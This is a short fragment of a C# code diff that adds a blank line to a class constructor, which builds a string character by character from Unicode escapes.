@@ -16,6 +16,7 @@ namespace ProjetoAuditoriaDeAtividades2
 
         public Cidghjex()
         {
+            
             e += "\u0064";
             e += "\u0061";
             e += "\u0074";
